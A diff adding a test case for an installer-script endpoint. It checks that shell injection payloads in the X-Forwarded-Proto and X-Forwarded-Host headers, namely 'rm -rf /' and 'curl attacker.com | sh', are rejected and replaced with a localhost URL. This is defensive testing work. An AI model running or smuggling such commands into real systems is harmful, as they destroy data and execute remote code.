@@ -64,6 +64,15 @@ describe('Public gt CLI and installer download endpoints', () => {
 
     expect(resDollar.status).toBe(200);
     expect(resDollar.text).toContain('INJECTED_HUB_URL="http://my-$1-host.internal"');
+
+    // Reject shell injection payloads in X-Forwarded-Host and X-Forwarded-Proto
+    const resInjected = await request(app)
+      .get('/install.sh')
+      .set('X-Forwarded-Proto', 'http"; rm -rf /; #')
+      .set('X-Forwarded-Host', 'evil.com"; curl attacker.com | sh; #');
+
+    expect(resInjected.status).toBe(200);
+    expect(resInjected.text).toContain('INJECTED_HUB_URL="http://localhost"');
   });
 
   it('contains strict Node.js >= 18 check and multi-OS installation guide in installer script', async () => {
